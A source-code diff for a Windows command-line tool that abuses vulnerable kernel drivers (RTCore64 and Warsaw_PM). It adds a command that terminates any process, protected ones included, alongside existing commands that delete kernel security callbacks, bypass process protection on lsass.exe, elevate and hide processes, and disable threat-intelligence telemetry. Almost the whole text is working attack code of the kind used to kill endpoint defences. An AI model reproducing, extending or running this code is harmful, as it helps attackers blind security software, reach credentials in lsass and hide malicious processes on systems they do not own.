@@ -34,7 +34,7 @@ const char* monitoredDrivers[] = {
 
 int main() {
 
-	HANDLE hDevice = CreateFile(
+	HANDLE hDeviceRW = CreateFile(
 		L"\\\\.\\RTCore64",
 		GENERIC_READ | GENERIC_WRITE,
 		0,
@@ -44,6 +44,23 @@ int main() {
 		NULL
 	);
 
+	HANDLE hDeviceTerm =  CreateFile(
+		L"\\\\.\\Warsaw_PM",
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		0,
+		NULL
+	);
+
+	if (hDeviceRW == INVALID_HANDLE_VALUE) {
+		printf("Error opening handle to RW vuln drv.\n");
+	}
+
+	if (hDeviceTerm == INVALID_HANDLE_VALUE) {
+		printf("Error opening handle to Terminator vuln drv.\n");
+	}
 	ntoskrnlBase = GetKernelBaseAddress();
 	
 	printf("Kernel base: %p\n", ntoskrnlBase);
@@ -62,38 +79,47 @@ int main() {
 		printf("> ");
 		fgets(input, 256, stdin);
 		//if (strncmp(input, "elproccallback", 14) == 0) {
-		//	DeleteProcCallback(hDevice);
+		//	DeleteProcCallback(hDeviceRW);
 		//}
-		if (strncmp(input, "listproccallback", 16) == 0) {
-			ListProcCallback(hDevice);
+		if (strncmp(input, "terminate", 9) == 0) {
+			DWORD pid = atoi(input + 10);
+			if (pid == 0) {
+				printf("Invalid PID.\n");
+				continue;
+			}
+			terminateProcess(hDeviceTerm, pid);
+		}
+
+		else if (strncmp(input, "listproccallback", 16) == 0) {
+			ListProcCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "listthreadcallback", 18) == 0) {
-			ListThreadCallback(hDevice);
+			ListThreadCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "listloadimagecallback", 21) == 0) {
-			ListLoadImageCallback(hDevice);
+			ListLoadImageCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "listregcallback", 15) == 0) {
-			ListRegCallback(hDevice);
+			ListRegCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "listobjcallback", 15) == 0) {
-			ListObjCallback(hDevice);
+			ListObjCallback(hDeviceRW);
 		}
 
 		else if (strncmp(input, "elproccallback", 14) == 0) {
-			DeleteProcCallback(hDevice);
+			DeleteProcCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "elthreadcallback", 16) == 0) {
-			DeleteThreadCallback(hDevice);
+			DeleteThreadCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "elloadimagecallback", 19) == 0) {
-			DeleteLoadImageCallback(hDevice);
+			DeleteLoadImageCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "elregcallback", 13) == 0) {
-			DeleteRegCallback(hDevice);
+			DeleteRegCallback(hDeviceRW);
 		}
 		else if (strncmp(input, "elobjcallback", 13) == 0) {
-			DeleteObjCallback(hDevice);
+			DeleteObjCallback(hDeviceRW);
 		}
 
 
@@ -103,11 +129,11 @@ int main() {
 				printf("Invalid PID.\n");
 				continue;
 			}
-			BypassPpl(hDevice, pid);
+			BypassPpl(hDeviceRW, pid);
 		}
 		else if (strncmp(input, "bypassppllsass", 14) == 0) {
 			DWORD64 pid = FindProcessId("lsass.exe");
-			BypassPpl(hDevice, pid);
+			BypassPpl(hDeviceRW, pid);
 		}
 
 		else if (strncmp(input, "elevateproc", 11) == 0) {
@@ -116,7 +142,7 @@ int main() {
 				printf("Invalid PID.\n");
 				continue;
 			}
-			elevateProc(hDevice, pid);
+			elevateProc(hDeviceRW, pid);
 		}
 		else if (strncmp(input, "hideproc", 8) == 0) {
 			DWORD pid = atoi(input + 9);
@@ -124,17 +150,19 @@ int main() {
 				printf("Invalid PID.\n");
 				continue;
 			}
-			hideProc(hDevice, pid);
+			hideProc(hDeviceRW, pid);
 		}
 
 		else if (strncmp(input, "disablewti", 10) == 0) {
-			disableWTI(hDevice);
+			disableWTI(hDeviceRW);
 		}
 		else if (strncmp(input, "exit", 4) == 0) {
 			exit(0);
 		}
 		else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
+
+			printf(" - terminate <PID>			- Terminate process (even PPL) by PID\n");
 
 			printf(" - listproccallback			- List process notify routines\n");
 			printf(" - listthreadcallback		- List thread notify routines\n");
@@ -165,5 +193,4 @@ int main() {
 			printf(" - exit						- Exit the program\n");
 		}
 	}
-
 }
